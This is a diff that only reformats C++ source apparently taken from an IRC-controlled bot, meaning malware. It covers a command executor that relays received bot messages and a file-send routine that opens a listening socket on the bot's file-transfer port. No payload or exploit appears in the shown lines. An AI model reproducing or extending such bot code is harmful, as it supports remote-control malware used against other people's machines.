@@ -419,30 +419,46 @@ bool CRSLControl::HandleCommand(CMessage *pMsg) {
 }
 
 void *CCmdExecutor::Run()
-{	while(!m_bMsgSet) Sleep(1000);
+{	while(!m_bMsgSet)
+        Sleep(1000);
 	g_cMainCtrl.m_cBot.Recv(&m_mMsg);
 	g_cMainCtrl.m_lCanJoin.push_back(this);
-	return NULL; }
+    return NULL;
+}
 
 void CCmdExecutor::Set(CMessage *pMsg)
-{	m_pMsg=pMsg; m_mMsg.bNotice=m_pMsg->bNotice; m_mMsg.bSilent=m_pMsg->bSilent; m_mMsg.sSrc.Assign(m_pMsg->sSrc); 
-	m_mMsg.sIdentd.Assign(m_pMsg->sIdentd); m_mMsg.sHost.Assign(m_pMsg->sHost); m_mMsg.sDest.Assign(m_pMsg->sDest);
-	m_mMsg.sChatString.Assign(m_pMsg->sChatString); m_bMsgSet=true; }
+{	m_pMsg=pMsg;
+    m_mMsg.bNotice=m_pMsg->bNotice;
+    m_mMsg.bSilent=m_pMsg->bSilent;
+    m_mMsg.sSrc.Assign(m_pMsg->sSrc);
+    m_mMsg.sIdentd.Assign(m_pMsg->sIdentd);
+    m_mMsg.sHost.Assign(m_pMsg->sHost);
+    m_mMsg.sDest.Assign(m_pMsg->sDest);
+    m_mMsg.sChatString.Assign(m_pMsg->sChatString);
+    m_bMsgSet=true;
+}
 
 void *CSendFile::Run()
-{		int				m_sListenSocket;
+{
+    int				m_sListenSocket;
 	sockaddr_in		m_lAddr;
 
-	int sClientSocket; sockaddr_in cAddr;
+    int sClientSocket;
+    sockaddr_in cAddr;
 	socklen_t cAddrLen=sizeof(cAddr);
-	unsigned char fileBuf[4096]; FILE *fp=NULL;
+    unsigned char fileBuf[4096];
+    FILE *fp=NULL;
 
 	memset(&m_lAddr, 0, sizeof(m_lAddr));
 	m_lAddr.sin_family=AF_INET;
 	m_lAddr.sin_addr.s_addr=INADDR_ANY;
 	m_lAddr.sin_port=htons(g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
 	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if(m_sListenSocket==SOCKET_ERROR) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
+    if(m_sListenSocket==SOCKET_ERROR)
+    {
+        g_cMainCtrl.m_lCanJoin.push_back(this);
+        return NULL;
+    }
 #ifdef DBGCONSOLE
 	g_cMainCtrl.m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Binding CSendFile to port %d.\n", this, g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
 #endif
